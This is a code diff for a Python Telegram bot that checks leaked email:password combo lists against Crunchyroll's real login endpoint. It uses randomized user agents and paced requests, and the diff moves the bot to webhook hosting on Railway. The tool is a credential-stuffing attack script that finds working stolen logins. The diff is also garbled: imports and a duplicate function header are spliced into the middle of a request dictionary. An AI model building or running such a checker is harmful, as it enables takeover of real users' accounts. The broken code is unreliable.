@@ -21,6 +21,27 @@ def crunchyroll_check(email: str, password: str):
         
         data = {
             "grant_type": "password",
+import os
+import asyncio
+import re
+import requests
+from uuid import uuid4
+from user_agent import generate_user_agent
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+
+
+def crunchyroll_check(email: str, password: str):
+    try:
+        url = "https://beta-api.crunchyroll.com/auth/v1/token"
+        headers = {
+            "Host": "beta-api.crunchyroll.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": generate_user_agent(),
+            "Accept-Encoding": "gzip"
+        }
+        data = {
+            "grant_type": "password",
             "username": email,
             "password": password,
             "scope": "offline_access",
@@ -50,7 +71,7 @@ def extract_combos(text):
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🔥 **Improved Crunchyroll Checker**\n\n"
+        "🔥 **Crunchyroll Checker (Webhook)**\n\n"
         "Paste messy text or upload .txt file"
     )
 
@@ -69,10 +90,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for i, combo in enumerate(combos, 1):
         email, pwd = combo.split(":", 1)
         await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}")
-        
         result = crunchyroll_check(email, pwd)
         await update.message.reply_text(result)
-        
         await asyncio.sleep(2.5)
 
 
@@ -99,11 +118,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await asyncio.sleep(2.5)
 
 
-# Fixed Error Handler (removes "No error handlers are registered" warning)
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    print(f"Bot Error: {context.error}")
-
-
 def main():
     TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
     if not TOKEN:
@@ -115,12 +129,16 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    
-    # This line fixes the "No error handlers are registered" error
-    app.add_error_handler(error_handler)
 
-    print("🚀 Improved Bot Running...")
-    app.run_polling()
+    print("🚀 Webhook Bot Starting...")
+
+    # Railway Webhook Setup
+    app.run_webhook(
+        listen="0.0.0.0",
+        port=int(os.getenv("PORT", 8080)),
+        url_path="",
+        webhook_url=f"https://{os.getenv('RAILWAY_PUBLIC_DOMAIN')}/"
+    )
 
 
 if __name__ == "__main__":
